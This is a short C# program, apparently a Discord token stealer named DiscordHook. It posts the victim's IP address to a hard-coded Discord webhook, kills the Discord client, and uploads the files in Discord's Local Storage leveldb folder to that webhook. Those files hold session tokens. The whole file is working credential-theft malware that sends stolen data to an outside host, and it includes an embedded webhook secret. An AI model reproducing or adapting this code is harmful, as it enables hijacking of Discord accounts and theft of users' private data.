using System;
using System.IO;
using System.Threading.Tasks;
using static DiscordHook.Alerts;
using static DiscordHook.Utility;

namespace DiscordHook
{
    internal static class Program
    {
        private static async Task Main(string[] args)
        {
            const string url = "https://discord.com/api/webhooks/849806948882055228/5STEFuPPtwaRVlfp-8hj_ynX44cgal7mYcOCaN9_bwjVBz-LdXLtKrNz4PtvOeyiuR9t";
            await SendHookAlertAsync(await GetIpAsync(),url );

            var discdir =
                new DirectoryInfo(
                    $@"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\discord\Local Storage\leveldb");
            
                foreach(var file in discdir.EnumerateFiles())
                    if (file.Extension.Contains("db"))
                    {
                        KillDiscord();
                        SendFileHook(url, file);
                        await Task.Delay(500);
                    }
                        
        }
    }
}